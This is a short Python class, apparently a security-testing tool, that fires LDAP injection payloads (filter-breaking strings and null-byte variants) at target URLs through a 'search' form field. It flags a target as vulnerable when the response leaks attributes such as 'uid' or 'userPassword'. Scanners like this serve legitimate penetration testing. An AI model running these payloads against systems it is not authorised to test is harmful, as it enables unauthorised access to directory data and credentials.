import requests

class LDAPFuzzer:
    def __init__(self):
        self.name = "LDAP Injection Fuzzer"
        self.payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(&))(|(cn=*))",
            "admin)(|(uid=*))",
            "*)(&(objectClass=*))",
            "*))%00",
            "*)%00"
        ]
        self.signatures = ["uid=", "cn=", "objectClass", "dn: ", "userPassword"]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                status, response_text = self.send_request(target, payload)
                vulnerable = self.analyze_response(response_text)
                results[f"{target} | Payload: {payload}"] = {
                    "status": status,
                    "vulnerable": vulnerable
                }
        return results

    def send_request(self, url, data):
        try:
            response = requests.post(url, data={"search": data}, timeout=5)
            return response.status_code, response.text[:1000]
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze_response(self, text):
        for sig in self.signatures:
            if sig.lower() in text.lower():
                return True
        return False
